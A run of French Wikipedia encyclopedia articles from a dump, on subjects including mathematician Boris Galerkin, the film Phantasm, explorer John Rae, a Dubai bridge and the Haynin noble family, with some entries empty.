Boris Grigorievitch Galerkine (en , ""), né le à Polotsk (Empire russe, aujourd'hui en Biélorussie) et mort le à Leningrad, est un mathématicien et un ingénieur biélorusse puis soviétique, réputé pour ses contributions à l'étude des treillis de poutres et des plaques élastiques. Son nom reste lié à une méthode de résolution approchée des structures élastiques, qui est l'une des bases de la méthode des éléments finis.
Biographie.
Jeunesse.
Ses parents ne pouvant subvenir seuls aux besoins de leur famille, Boris Galerkine commence à travailler comme écrivain public dès l'âge de 12 ans. Ayant alors fini ses études primaires à Polotsk, il passe un examen à Minsk en 1893 pour continuer à étudier au lycée, mais la même année il réussit le concours d'entrée de l’Institut Technologique de Saint-Pétersbourg, et est admis dans la filière de génie mécanique. Il doit continuer à travailler pendant ses études, comme dessinateur et répétiteur privé.
L'engagement politique.
Comme beaucoup d'étudiants scientifiques russes de cette époque, Galerkine s'implique dans la politique et en 1899 il s'inscrit au Parti ouvrier social-démocrate de Russie, ce qui peut expliquer qu'il change plusieurs fois d'employeur à l'époque : les trois premières années suivant sa sortie d'école, il travaille comme ingénieur à l'usine de Kharkov de l'Union Russe Mécanique et Ferroviaire, tout en donnant des cours du soir aux ouvriers ; puis à la fin de 1903 il rejoint le chantier du Chemin de fer de l’Est chinois, et six mois plus tard prend la direction technique de l'Usine des machines et chaudières du Nord. Il s'implique dans la création du Syndicat des Ingénieurs de Saint-Pétersbourg et en 1905 est arrêté en tant que meneur d'une grève. En 1906, Boris Galerkine devient membre permanent du comité central du POSDR.
Le , la police cerne sa maison du 13, rue Alexeïevskaïa, non loin de la gare d’Oudelnaïa et arrête tous les membres du comité. Jugés le , le tribunal se montre curieusement clément à leur égard, si l'on considère que plusieurs prévenus avaient ouvert le feu sur les forces de l'ordre au moment de leur interpellation : l'un des 19 membres du Comité est condamné à deux ans d'incarcération, et 8 autres, dont B. G. Galerkine (dit « Zakhar », son nom dans la clandestinité) à 18 mois, les derniers étant relaxés.
Dans la prison, surnommée « Kresty » par les détenus, Galerkine se détourne de l'activisme révolutionnaire au profit des sciences et de la technique. Les conditions de détention à cette époque favorisent cette reconversion. Mais on lit même dans les cahiers de Galerkine qu'en 1907 il aurait travaillé comme ingénieur à la construction de la centrale thermique de Saint-Pétersbourg : ce fait n'a jamais été vraiment éclairci, et par la suite Galerkine renâclait à revenir sur son engagement de jeunesse. Sous le régime soviétique, il répond aux questionnaires de façon très évasive sur son appartenance politique à cette époque. S'il est certain qu'il connaissait la carrière de ses anciens comparses, la principale raison de son abstention est qu'il a été porté au Comité par la faction des mencheviks, une révélation qui aurait pu lui coûter la vie.
Carrière académique.
Galerkine retrouve la liberté à la fin de 1908. En mars, il obtient un poste de professeur à l'Institut Polytechnique de Saint-Pétersbourg, et commence à publier le fruit de ses travaux (menés dans la « prison Kresty ») dans le journal scientifique de cet établissement, les "Transactions de l’Institut Polytechnique" : il s'agit d'un article intitulé « "Théorie et expérimentation de la flexion longitudinale, avec application aux structures multi-niveaux, aux treillis articulés et aux treillis à jonctions rigides" ». La longueur du titre fait écho à celle de l'article lui-même : 130 pages. L'été de 1909, Galerkine entreprend une série de voyages à l'étranger pour voir les constructions et édifices dont il a entendu parler. Au cours des quatre années qui suivent, et qui se terminent par l'entrée en guerre de la Russie en , il visite l’Europe en compagnie de plusieurs de ses collègues de l'Institut : l'Allemagne, l’Autriche, la Suisse, la Belgique et la Suède.
Galerkine assure les travaux dirigés et les cours d'atelier de mécanique des structures sous la direction du professeur V.L. Kirpichov, directeur de l'École de Mécanique de Saint-Pétersbourg. Mais la plupart de ses collègues : I. G. Boubnov, A.N. Krylov, I. V. Mechersky et S. P. Timoshenko, travaillent à l’Institut Polytechnique.
À l'automne 1911, on confie à Galerkine, en plus de ses activités précédentes, les cours de l'Institut Polytechnique Féminin. En 1913, il conçoit la structure métallique de la chaudière de la centrale thermique de Saint-Petersbourg, qui est la première grande structure métallique de type coque en Russie conçue pour les hautes pressions. Jusqu'en 1915, Galerkine n'a publié que sur les structures en treillis, mais à compter de cette date il commence à s'intéresser aux plaques.
En 1915, Galerkine publie un article où il propose une méthode de résolution approchée pour résoudre les équations différentielles, en particulier les problèmes de conditions aux limites ; il y applique sa méthode à des treillis de grande taille et à l'équilibre des plaques. Quelque temps auparavant, I. G. Boubnov a imaginé une approche semblable pour résoudre le problème variationnel associé à l'équation d'équilibre (minimum de l'énergie de déformation élastique), approche qu'il interprète comme une variante de la méthode de Ritz. La méthode de Galerkine se distingue par le fait qu'on pouvait l'appliquer directement à une équation différentielle sans recourir à un principe variationnel ; Galerkine interprète son algorithme par analogie avec le principe des puissances virtuelles. Ces idées s'avèrent très fertiles, non seulement en mécanique des structures, mais pour toute la physique mathématique de l'entre-deux-guerres.
Période soviétique.
De 1917 à 1919, il publie plusieurs articles sur la statique des plaques triangulaires et rectangulaires sous différentes conditions d'appui et de chargement, la plupart dans les "Transactions de l’Académie des sciences de Russie". En , Galerkine obtient la chaire de mécanique des structures nouvellement créée à l'Institut, puis après la fuite en Pologne du professeur S. P. Belzetsky au cours de l'été 1921, il est nommé professeur de la Faculté de Génie Civil, domaine qui coïncide plus précisément à ses intérêts scientifiques du moment.
À partir de 1922, Galerkine ne publie plus que dans les revues étrangères (une pénurie de papier frappe alors la Russie, en proie à la Révolution). Il est élu doyen de la Faculté de Génie Civil en : cette élection intervient à la suite de la démission de plusieurs professeurs, indignés des menées de soi-disant « étudiants » manipulés par les soviets et les comités du Parti communiste. Galerkine, désormais à la tête de la Faculté, parvient à composer avec les circonstances : il sait contenir les « assistants » qu'on lui a imposés, et temporise dans l'application des directives de supérieurs hiérarchiques incompétents, qui à l'époque multiplient les expériences en matière éducative. De 1924 à 1929, Galerkine exerce encore en tant que professeur à l'Institut des Chemins de Fer et à l'Université de Saint-Pétersbourg. En 1924 il prend part au "Congrès international de mécanique appliquée" aux Pays-Bas ( de l'IUTAM), et ce devait être son dernier voyage à l'étranger.
En 1926, ayant appris qu'à l'instigation du Comité politique de l'Institut, le "Narkompros" (ministère de l'Éducation) venait de voter la dissolution du Département des Voies de Communication, Galerkine représente aux autorités de Moscou qu'il n'existe plus aucune école dans le pays pour donner des cours d'infrastructures ferroviaires, et parvient à faire annuler la décision. Il crée aussi les premiers laboratoires de la faculté avec l'appui du gouvernement ; l’un d’eux donne naissance à l’Institut de recherche hydrotechnique.
En , sur proposition d’Abram Ioffé, de A. N. Krylov et de P. P. Lazarev, Galerkine est nommé membre correspondant de l’Académie des sciences d’URSS. Il est depuis plusieurs années une autorité de rang international, souvent choisi comme consultant pour les projets industriels de grande ampleur dans le nord-ouest de la Russie (centrales thermiques, centrale hydroélectrique de Volkhov, usine de pâte à papier de Kondopoga, etc.), membre des bureaux d'étude Gipromez et Giprotsvetmet, et conseiller scientifique de l’Institut de l’Irrigation (le futur "Institut de Recherche Hydrotechnique") et de l’Institut des Structures. Une fois achevée la construction de l'usine hydroélectrique du Dniepr, Galerkine est choisi comme membre de la commission gouvernementale hydroélectrique.
Lorsqu'en 1934, les autorités rétablissent les grades universitaires, Galerkine se voit attribuer deux doctorats, l'un en techniques industrielles et l'autre en mathématiques. Au début de 1936 il devient membre titulaire de l’Académie des sciences d’URSS, à côté de multiples marques de reconnaissance du régime ; en avril, il obtient la présidence de la Commission Gouvernementale des travaux du Palais des Soviets de Moscou.
En dépit de tous ces titres, Galerkine continue d'exercer en tant que professeur de mécanique des structures et d'élasticité de l’"Institut Hydrotechnique" (rattaché à la faculté de génie civil depuis 1934). Il enseigne essentiellement l'élasticité mathématique, mais le faible niveau scientifique des étudiants de l'époque rend son cours peu abordable : les étudiants viennent voir l'« académicien », mais le professeur lui-même est peu prolixe et parle d'une voix faible. Son image ne correspond pas au grand savant qu'ils s'imaginaient, sa reconnaissance est d'ailleurs surtout gouvernementale.
La guerre avec l'Allemagne.
Avec la refondation en 1939 de l'Institut de génie militaire (grâce aux dons de l’Institut Polytechnique de Saint-Pétersbourg), Galerkine, nommé à la tête du département de Mécanique des Structures, doit prendre l'uniforme. En tant qu'académicien, on le reclasse avec le grade de lieutenant-général. Au cours de l'été 1941, le gouvernement de Léningrad crée une "Commission des Installations Défensives", et y affecte les quelques académiciens et savants de la ville, mais seul Galerkine participe vraiment à des travaux de construction, de sorte qu'il s'impose comme le président de cette Commission.
Quelques mois plus tard, il est évacué sur Moscou où il rejoint la Commission du Génie militaire de l'Académie des Sciences d'URSS. Sa santé se dégrade par suite du surmenage : il meurt à Moscou quelques semaines après la capitulation du Troisième Reich le .

</doc>
<doc id="2843876" url="https://fr.wikipedia.org/wiki?curid=2843876" title="Rêves de transition">
Rêves de transition

Rêves de transition (titre original : "Transition Dreams") est une nouvelle de l'écrivain de science-fiction Greg Egan, publiée en octobre 1993 dans la revue "Interzone" et reprise dans le recueil "Our Lady of Chernobyl" en 1995.
Résumé.
Un homme décide de faire faire par une société spécialisée dans ce type de services la copie exacte, sous forme de logiciel, de ses processus mentaux afin de les réintégrer dans un robot et jouir ainsi d'une vie sans maladie, sans vulnérabilité et sans mort. Il est averti qu'après le processus de copie, la mise en route du logiciel produit des rêves, appelés rêves de transition, qui ne laissent aucun souvenir une fois la copie entièrement activée. Il commence alors à s'inquiéter au sujet de la nature de ces rêves.
Thèmes.
Le thème de départ est classique : il s'agit d'échapper à la maladie et à la mort en se débarrassant d'une enveloppe charnelle jugée inessentielle. Le procédé utilisé dans cette nouvelle consiste à reproduire dans leurs moindres détails les fonctions cérébrales, ce qui introduit les thèmes de l'identité et de la continuité d'un être. 
Pour montrer la difficulté à penser ces deux derniers thèmes, Egan utilise l'idée de rêves produit lors de la transition d'un état humain à un état de robot, et y ajoute un élément dramatique, l'idée que ces rêves ne font pas l'objet de souvenirs, ce qui introduit une discontinuité dans l'existence du personnage. Egan va alors jouer sur cette continuité problématique de l'identité et du souvenir d'une expérience subjective (le rêve) pour placer le lecteur à un point de vue où il ne peut plus reconnaître avec certitude de continuité dans la subjectivité du personnage.
Tout d'abord, en effet, le lecteur va être le spectateur paradoxal d'une expérience subjective qui "ne peut pas" avoir de spectateur, celle du rêve ; mais puisque cette expérience du rêve de transition ne doit laisser aucune trace, le lecteur accède à un point de vue subjectif plus subjectif que celui que possède le personnage lui-même. Ce point de vue du lecteur omniscient renseigné par l'auteur omniscient est classique, et permet à Egan de placer le lecteur à un point de vue où ce dernier croit avoir accès de manière privilégiée à la subjectivité totale du personnage et à tout ce qui lui arrive.
Mais, ensuite, lorsque le personnage comprend, et le lecteur avec lui, que le rêve a déjà commencé, que ce que l'on a lu est déjà un rêve, et que ce rêve se présente comme une recomposition chaotique de souvenirs, il n'est plus possible de savoir si l'on assiste à un rêve qui se produit lors de la désactivation du cerveau du personnage, ou si celui-ci est déjà en train de se réveiller dans le robot. Le problème est alors que, dans le premier cas, il s'agit toujours du "même" personnage en train de se décomposer en rêve (son cerveau est détruit dans le processus de copie), tandis que, dans le second cas, il s'agit de la recomposition du personnage comme copie, et donc peut-être d'un "autre" personnage, mais "identique".
L'auteur propose ainsi au lecteur plusieurs points de vue que ce dernier peut choisir ou non : 
Au-delà de son caractère de science-fiction, illustré par la transition d'identité opérée par des moyens technologiques sophistiqués, cette histoire est une transposition de la transition que tout être humain vit à chaque éveil : si le réveil permet de recomposer une conscience de soi composée de souvenirs, peut-on être certain que c'est la "même" personne qui se réveille dans notre corps que celle qui s'est endormie ?
Réception critique.
Cette nouvelle est généralement jugée assez faible et médiocre.

</doc>
<doc id="2843881" url="https://fr.wikipedia.org/wiki?curid=2843881" title="Samuel Hadida">
Samuel Hadida

Samuel Hadida, né le à Casablanca au Maroc et mort le à Santa Monica (Californie), est un producteur français de films.
Biographie.
Il a notamment mis à l'écran cinq films de la très populaire saga de jeux vidéo "Resident Evil". Il a aussi fait de même pour " Silent Hill".
Au début des années 1980, Samuel Hadida et son frère Victor ont rejoint la société Metropolitan Filmexport fondée par leur père David Hadida en 1978. La société est devenue plus tard un distributeur indépendant à succès de films dans le monde francophone. Samuel Hadida a formé une nouvelle société, Davis Films, en 1990, et a produit plus de trente films hollywoodiens de 1993 à 2006, "True Romance" étant le premier. 

</doc>
<doc id="2843883" url="https://fr.wikipedia.org/wiki?curid=2843883" title="Mandaloriens">
Mandaloriens



</doc>
<doc id="2843891" url="https://fr.wikipedia.org/wiki?curid=2843891" title="Nævus simplex">
Nævus simplex

Le nævus simplex est une tache de naissance qui apparait sur environ un tiers des nouveau-nés. Il est causé par la dilatation de certains vaisseaux sanguins. Il devient plus foncé en cas d'énervement et de changement de température extérieure.
Localisation.
Le nævus simplex se situe généralement sur le visage du nourrisson, entre les sourcils, sur le nez ou derrière le cou. Il s'agit d'une tache rosée et plate, sans altération de la peau.
Traitement.
Aucun traitement n'est véritablement nécessaire. Il n'existe normalement pas de complications. Les taches sur le visage sont temporaires et disparaissent généralement vers 2 ans, celles dans le cou peuvent disparaitre plus tard ou rester chez l'adulte dans la moitié des cas.
Autres appellations.
Les appellations dans le langage commun sont variées et parfois poétiques :

</doc>
<doc id="2843894" url="https://fr.wikipedia.org/wiki?curid=2843894" title="Benzènediol">
Benzènediol

Le benzènediol ou dihydroxybenzène ou encore diphénol, est un composé aromatique, constitué d'un noyau benzénique, et de deux groupes hydroxy OH. Il a pour formule brute .
Il existe sous la forme de trois isomères, en fonction de la position des deux groupes hydroxyles sur le noyau benzénique (respectivement position "ortho", "méta" et "para") :
Propriétés.
Ces trois composés ont la même apparence, un solide granuleux transparent à blanc dans les conditions normales de température et de pression, mais qui noircit en présence de dioxygène.
Comme dans la plupart des phénols, les deux groupes hydroxy sont des acides faibles. Chacune des formes du benzènediol peut perdre un proton, donnant ainsi un ion phénolate.
De par sa structure, l'hydroquinone peut même perdre les protons de ses deux fonctions hydroxy pour former un ion diphénolate. Le sel diphénolate de sodium (de l'hydroquinone) est d'ailleurs utilisé comme comonomère dans la synthèse du polyétheréthercétone (PEEK).

</doc>
<doc id="2843896" url="https://fr.wikipedia.org/wiki?curid=2843896" title="Phantasm">
Phantasm

 ou Fantasme au Québec est un film d'horreur américain réalisé par Don Coscarelli, sorti en 1979 qui présente l'Homme en Noir (Angus Scrimm), un croque-mort surnaturel et malveillant qui transforme les morts de la Terre en zombies de tailles réduites pour les envoyer dans une autre dimension afin des les utiliser comme esclaves.
Le film suit un adolescent qui découvre des phénomènes et des êtres aussi terrifiants que fantastiques, qui hantent les locaux d'une entreprise de pompes funèbres.
 donnera naissance à quatre suites.
Synopsis.
Alors qu'ils ont des relations sexuelles dans le cimetière de Morningside, un homme nommé Tommy est tué par sa partenaire. Lors des funérailles, les amis de Tommy, Jody et Reggie, croient qu'il s'est suicidé. Mike Pearson, le frère de Jody âgé de 13 ans, observe secrètement les funérailles aux jumelles et voit le croque-mort - surnommée "l'Homme en Noir" - replacer le lourd cercueil de Tommy sans effort malgré son poids dans le corbillard en lieu et place de terminer l'enterrement. Inquiet, Mike se rend alors chez une vieille voyante et lui raconte ses peurs ainsi que ce qu'il a vu au cimetière. 
Plus tard, Jody est séduit par une prostituée dans un bar et qui l'emmène au sinistre cimetière pour avoir des relations sexuelles. Cependant, ils sont interrompus par Mike qui a suivi Jody et a été chassé de sa cachette par une petite silhouette cagoulée hurlant. Mike essaie de parler à Jody de la créature, mais Jody s'en fiche. Au mausolée, Mike est poursuivi par une mystérieuse sphère argentée volante et est ensuite attrapé par le gardien, mais Mike s'échappe lorsque la sphère tue le gardien par erreur. Mike échappe alors à l'Homme en Noir en claquant une porte pour s'enfuir. Les doigts de l'Homme en Noir sont alors coincés puis coupés au couteau par Mike, mais ils continuent de bouger sur le sol en dégoulinant de sang jaune. Emportant l'un des doigts avec lui comme preuve, Mike quitte le mausolée.
Le doigt toujours en mouvement suffit à convaincre Jody des histoires de Mike. Avant que Jody ne puisse l'apporter au shérif, le doigt se transforme en mouche noire géante. Reggie, leur ami, qui voit le doigt transformé en insecte géant les attaquer, rejoint les frères dans leur enquête. Jody se rend seul au cimetière mais est chassé par les êtres de petites tailles encapuchonnées et un corbillard apparemment sans conducteur. Il est sauvé par Mike dans sa Plymouth Cuda noire. En faisant sortir le corbillard de la route, ils découvrent avec stupeur qu'il était en fait conduit par l'une des petites créatures, un "Tommy" réanimé et rétréci, qu'ils cachent dans le camion de glaces de leur ami Reggie.
Reggie et Jody décident de vaincre l'Homme en Noir, tandis que Mike est caché dans une boutique d'antiquités appartenant à deux amies de Jody, Sally et Sue. Là, Mike découvre une vieille photo de l'Homme en Noir en croque-mort d'un autre siècle et insiste pour être ramené chez lui. Sur le chemin, Mike, Sally et Sue tombent sur le camion de glaces de Reggie renversé. Ils sont attaqués dans la voiture par une horde de petites créatures encapuchonnés. Mike parvient à s'échapper par le pare-brise arrière du véhicule, en présumant que les filles et Reggie sont morts.
Jody se rend au mausolée pour tuer l'Homme en Noir, enfermant d'abord Mike dans sa chambre pour sa propre sécurité. Mike s'échappe habilement, mais tombe sur l'Homme en Noir qui l'attendait devant la porte d'entrée de sa maison. L'Homme en Noir kidnappe Mike dans un corbillard, mais Mike s'échappe une nouvelle fois de justesse avant que le corbillard ne heurte un poteau puis explose. En cherchant Jody dans le mausolée, Mike est pris pour cible par l'étrange sphère, l'orbe d'argent, jusqu'à ce que Jody la détruise avec son fusil à pompe. Mike et Jody retrouvent Reggie et ensemble, ils entrent dans une pièce étrangement blanche, remplie de bidons noirs contenant les créatures de petites tailles. Mike aperçoit brièvement à travers un portail dimensionnel un monde rouge et chaud où les petites créatures travaillent, semble-t-il, comme esclaves.
Une panne de courant soudaine sépare le trio d'amis. Resté seul dans la pièce, Reggie active le portail dimensionnel, créant un puissant vide d'air dont il s'échappe non sans mal. Dans la tempête qui s'ensuit, Reggie est poignardé devant le mausolée par la même prostitué qui avait tuée Tommy et séduit Jody. Tandis que Mike et son frère s'enfuient, le grand mausolée disparaît dans un rayonnement. Jody élabore alors un plan pour piéger l'Homme en Noir dans un des puits de la mine abandonnée avoisinante. L'Homme en Noir attaque Mike chez lui et le poursuit à l'extérieur de la maison où chemin faisant il finit par tomber dans le vieux puits et enseveli sous une avalanche de roches déclenchée par Jody.
Mike se réveille alors chez lui, dans son lit, toujours inquiet de l'Homme en Noir et ses monstrueuses créatures. Dans le salon, Reggie lui dit que tout ce que Mike a vécu jusqu'à présent n'était qu'un cauchemar provoqué par le chagrin du deuil car Jody est mort dans un accident de voiture l'année précédente. Promettant de s'occuper de Mike comme l'aurait fait son grand frère, Reggie propose un voyage en voiture pour se changer les idées. Mike acquiesce et sourit à l'idée de voyager. Lorsque Mike entre dans sa chambre pour faire ses bagages, l'Homme en Noir apparaît et des mains monstrueuses sortent du miroir de l'armoire derrière Mike en le brisant en attrapant Mike pour l'amener à l'intérieur.
Accueil.
Le film a connu le succès commercial, rapportant environ au box-office en Amérique du Nord pour un budget de . En France, il a réalisé .
Il a reçu un accueil critique favorable, recueillant 73 % de critiques positives sur le site agrégateur de critiques Rotten Tomatoes.
Distinctions.
"Phantasm" a remporté le prix spécial du jury au Festival international du film fantastique d'Avoriaz 1979 et a été nommé au Saturn Award du meilleur film d'horreur en 1980.
Éditions en vidéo.
Le film est sorti en France chez l'éditeur "ESC Editions" d'abord en combo DVD / Blu-ray (sortie le ) puis en DVD simple avec plusieurs bonus et enfin en coffret intégrale (sorti le ).

</doc>
<doc id="2843898" url="https://fr.wikipedia.org/wiki?curid=2843898" title="Commission royale d'enquête sur tous les griefs affectant les sujets de Sa Majesté dans le Bas-Canada">
Commission royale d'enquête sur tous les griefs affectant les sujets de Sa Majesté dans le Bas-Canada

La Commission royale d'enquête sur tous les griefs affectant les sujets de Sa Majesté dans le Bas-Canada ("Royal Commission for the Investigation of all Grievances Affecting His Majesty's Subjects of Lower Canada") est une commission royale d'enquête mise sur pied en 1835, sept ans après la publication du rapport d'un Comité spécial de la Chambre des Communes sur le gouvernement civil du Bas-Canada dans lequel des modifications constitutionnelles importantes avait été recommandées.
C'est le nouveau gouverneur général de l'Amérique du Nord britannique, Archibald Acheson, de Gosford, qui dirigea la commission d'enquête avec l'aide de deux autres commissaires, Charles Edward Grey et George Gipps. Des instructions sur la façon de conduire l'enquête leur furent remises par Charles Grant, Glenelg, secrétaire d'État à la guerre et aux colonies.
Le rapport.
Cinq rapports, en plus d'un sixième rapport général furent préparés par la commission.
Les commissaires publièrent un premier rapport sur les questions financières en . Rédigé par Gipps, le rapport recommandait que tous les revenus de la couronne soient rendus à l'Assemblée législative à l'exception d'une liste civile modeste. Un deuxième rapport fut publié en mars. Il recommandait l'abrogation du "Revenue Act" de 1831 afin que l'exécutif dispose de fonds suffisants pour la livraison des services essentiels du gouvernement. En mai, un troisième rapport rejeta la proposition de la Chambre d'Assemblée du Bas-Canada de modifier la constitution de façon que les membres du Conseil exécutif soient responsables devant celle-ci.
Le rapport final fut publié le , 1836. Il rejeta la proposition de modifier le système électoral de façon à augmenter la représentation des colons britanniques dans la colonie.
Les travaux de la commission servent de point de départ à la rédaction des dix résolutions que John Russell, Secrétaire d'État au département de l'intérieur, présente à la Chambre des communes britannique le .

</doc>
<doc id="2843899" url="https://fr.wikipedia.org/wiki?curid=2843899" title="Benzène-1,4-diol">
Benzène-1,4-diol



</doc>
<doc id="2843903" url="https://fr.wikipedia.org/wiki?curid=2843903" title="Benzène-1,3-diol">
Benzène-1,3-diol



</doc>
<doc id="2843913" url="https://fr.wikipedia.org/wiki?curid=2843913" title="STS-112">
STS-112

STS-112 est la vingt-sixième mission de la navette spatiale Atlantis et la quinzième mission d'une navette américaine vers la Station spatiale internationale (ISS).
Objectifs.
STS-112 est une mission d'assemblage (9A) de la station spatiale internationale, avec la livraison de la poutre S1 qui supporte les radiateurs de la Station spatiale. Elle a aussi livré le chariot Crew Equipment Translation Aid (CETA) à la station. Le chariot CETA a été fixé au Mobile Transporter (amené par la mission STS-110) pour être utilisé par les équipes de montage sur des missions ultérieures. STS-112 a également effectué plusieurs expériences scientifiques dans la station dont le "Plant Generic Bioprocessing Apparatus (PGBA)", le "Commercial Generic Bioprocessing Apparatus (CGBA)", le "Protein Crystal Growth Single-locker Thermal Enclosure System housing the Protein Crystillization Apparatus for Microgravity (PCG-STES-PCAM)" et des échantillons pour l'expérience Zeolite Crystal Growth Furnace (ZCG).

</doc>
<doc id="2843915" url="https://fr.wikipedia.org/wiki?curid=2843915" title="Rue Thiéfry (Bruxelles)">
Rue Thiéfry (Bruxelles)

La rue Thiéfry (en néerlandais : "Thiéfrystraat") est une rue bruxelloise de la commune de Schaerbeek qui va de la rue Josaphat à l'avenue Paul Deschanel, à hauteur de l'avenue Rogier et du square Émile Duployé, en passant par la rue des Coteaux.
Histoire et description.
La rue porte le nom d'un homme politique belge, Charles Thiéfry, né à Antoing le et décédé à Bruxelles le .
La numérotation des habitations va de 1 à 143 pour le côté impair et de 2 à 100 pour le côté pair.
Distillerie Fovel.
Localisation : 
La distillerie Fovel, fondée en 1864 par Joseph Fovel, est la seule encore en activité en région bruxelloise. Cette distillerie familiale produit divers genièvres et alcools : genièvre de Bruxelles "Manneken-Pis" , genièvre de Hasselt , genièvre "Griotte de Schaerbeek" , liqueur à l'orange "Grand-Place" , kirsch cerises , liqueur triple sec , fine Fovel , vodka "Dimitri" , gin "Keylitt" , whisky "Gold Fighter" , malt "Wooton" , rhum brun ou blanc , alcool extra fin ...

</doc>
<doc id="2843919" url="https://fr.wikipedia.org/wiki?curid=2843919" title="Le Parfum - Histoire d'un meurtrier">
Le Parfum - Histoire d'un meurtrier



</doc>
<doc id="2843922" url="https://fr.wikipedia.org/wiki?curid=2843922" title="La Banque de données santé publique (BDSP)">
La Banque de données santé publique (BDSP)



</doc>
<doc id="2843933" url="https://fr.wikipedia.org/wiki?curid=2843933" title="John Rae (explorateur)">
John Rae (explorateur)

John Rae ( – ) est un explorateur écossais de l'Arctique canadien.
Biographie.
Rae naît au Hall of Clestrain dans la paroisse d'Orphir dans les Orcades. Après avoir étudié la médecine à Édimbourg, il entre dans la Compagnie de la Baie d'Hudson en tant que médecin. Il accepte d'être envoyé à Moose Factory (Ontario) et y reste dix ans.
En 1846, il fait sa première expédition, et en 1848 il rejoint John Richardson dans sa recherche du passage du Nord-Ouest. En 1853 il explore avec d'autres personnes l'île du Roi-Guillaume et noue des contacts avec les Inuits de la région ; de ceux-ci il apprend le destin de l'expédition disparue de John Franklin. La révélation de preuves de possible cannibalisme parmi les membres de l'expédition Franklin, choque l'opinion victorienne et mène à l'ostracisme de Rae par les membres de l'establishment britannique. Il meurt ainsi dans l'indifférence, quarante ans plus tard.
En 1860, il travaille sur la ligne télégraphique entre l'Europe et l'Amérique, visitant l'Islande et le Groenland. En 1864 il fait un autre chantier télégraphique dans l'ouest du Canada.
Il mourut à Kensington en Londres en 1893 et gît maintenant au cimetière de la cathédrale Saint-Magnus de Kirkwall, où se trouve un mémorial en son honneur. Une "" se trouve à l'endroit où il décéda. 
Le détroit de Rae, situé entre l'île du Roi-Guillaume et la péninsule de Boothia, et l'isthme de Rae sont tous les deux nommés en son honneur. Ils se situent au Nunavut. Le village de Rae-Edzo (aujourd'hui Behchokǫ̀), dans les Territoires du Nord-Ouest, avait également été nommé en son honneur.

</doc>
<doc id="2843934" url="https://fr.wikipedia.org/wiki?curid=2843934" title="Pont Cheïkh Rashid bin Saeed">
Pont Cheïkh Rashid bin Saeed

Le pont Cheïkh Rashid bin Saeed est un pont en arc de type bow-string qui doit franchir le khor Dubaï à Dubaï aux Émirats arabes unis, dont la construction doit commencer en et se terminer en 2012.
Le pont reliera les localités d'Al Jaddaf et Bur Dubaï.
Le coût présumé de sa construction est de 3 milliards de dirhams.
Pont Rashid bin Saeed Al Maktoum.
Son nom a été donné en hommage au Cheikh Rashid ben Saeed Al Maktoum, ancien émir de Dubaï pendant 32 ans, qui fut Vice-Président et Premier ministre des Émirats arabes unis de 1979 à 1990. 
Il a été désigné aussi comme étant la « sixième traversée » car il existe avant sa construction quatre ponts et un tunnel.
Caractéristiques.
Il mesurera environ (en deux portées), ce qui en fera le plus long pont en arc du monde. L'arc ouest culminera à de hauteur et s'étendra sur de long.
Son design doit rappeler la forme des dunes, très présentes à Dubaï, et des vagues.
Il portera six voies de circulation automobile dans chaque sens, en plus d'une ligne de métro, placée au centre.

</doc>
<doc id="2843935" url="https://fr.wikipedia.org/wiki?curid=2843935" title="Mémorial national de la guerre d'Algérie et des combats du Maroc et de la Tunisie">
Mémorial national de la guerre d'Algérie et des combats du Maroc et de la Tunisie

Le Mémorial national de la guerre d'Algérie et des combats du Maroc et de la Tunisie est un monument aux morts érigé sur le quai Jacques-Chirac, dans le de Paris, face à la tour Eiffel, pour commémorer les conflits d'indépendance ayant eu lieu en Afrique française du Nord (AFN) de 1952 à 1962 : ceux localisés dans les départements français d'Algérie et départements français du Sahara, rétrospectivement appelés la guerre d'Algérie (1954-1962), et ceux situés dans le protectorat français du Maroc et protectorat français de Tunisie, nommés « combats de Tunisie et du Maroc » (1952-1956, puis 1961 pour la crise de Bizerte).
Il célèbre la mémoire des morts pour la France, français et harkis, ainsi que celle des victimes civiles.
Il a été inauguré le par le président de la République, Jacques Chirac, en présence de Michèle Alliot-Marie, ministre de la Défense, et Hamlaoui Mekachera, secrétaire d'État aux Anciens combattants. En 2003, c'est en mémoire de l'inauguration de ce monument que la date du 5 décembre a été choisie pour instituer la « journée nationale d'hommage aux morts pour la France pendant la guerre d'Algérie et les combats du Maroc et de la Tunisie ».
Description.
Le mémorial est l'œuvre de Gérard Collin-Thiébaut. Il est constitué de trois afficheurs électroniques verticaux enchâssés dans trois colonnes de de haut, faisant défiler, respectivement dans chacune des trois couleurs du drapeau de la France, des informations relatives aux personnes et événements commémorés :
Au sol est gravé : .
Il y a également une plaque où figure l'inscription : .

</doc>
<doc id="2843937" url="https://fr.wikipedia.org/wiki?curid=2843937" title="Dh3b">
Dh3b



</doc>
<doc id="2843943" url="https://fr.wikipedia.org/wiki?curid=2843943" title="Maison de Haynin">
Maison de Haynin

La Maison de Haynin est une ancienne et illustre famille noble du comté de Hainaut, qui a pour origine Étienne de Denain, vivant en 1205, qui, après son mariage avec Rose de Mons, dame de Haynin, prit le nom de cette terre. Elle donna de nombreuses branches.
En 1774, François-Alexandre Aubert de La Chenaye-Desbois écrit que la famille de Haynin « ne subsiste plus que dans deux branches, à savoir celle des seigneurs de Wambrechies qui est l'aînée et celle des seigneurs du Cornet qui est la cadette ».
Nicolas Viton de Saint-Allais écrit en 1840 que la maison de Haynin « s’est éteinte dans les deux branches de Wambrechies, qui était l’ainée, et dans celle des seigneurs du Cornet, qui était la cadette ».
En 1857, Félix-Victor Goethals donne une généalogie de la famille de Haynin (résumée dans cet article), dans laquelle il lui rattache un rameau, issu de la branche cadette du Cornet, qu'il nomme "Hennin de Boussu", qui sera notamment à l'origine de la famille de Hennin de Boussu Walcourt et de la famille des de Haynin de Bry.
Des généalogistes contemporains, comme Pierre Sage ou Thierry de Hennin de Boussu Walcourt tentent de confirmer dans leurs travaux le rattachement de la famille de Hennin de Boussu Walcourt à la maison de Haynin. D'autres généalogistes contemporains, comme Frédéric Collon, Jean-François Houtart ou encore le collectif de généalogistes Blaise d'Ostende-à-Arlon, émettent des réserves ou rejettent ce rattachement.
Origine.
Selon La Chenaye-Desbois, une ancienne tradition de cette maison est de tirer son nom de la Hayne, rivière près de Mons, et d'être cadette des anciens seigneurs de Denain.
Félix-Victor Goethals écrit que la maison de Haynin doit son nom à la seigneurie de Haynin, près de Saint-Ghislain en Hainaut, et que la similitude des armories a fait supposer que les seigneurs de Haynin appartenaient à une branche cadette des seigneurs de Denain
Généalogie.
Les différents auteurs anciens ou plus récents, ne s'accordent pas complètement sur les premières générations de la maison de Haynin, mais sans en écarter des erreurs, on peut en ressortir les premiers degrés suivants :
Branches.
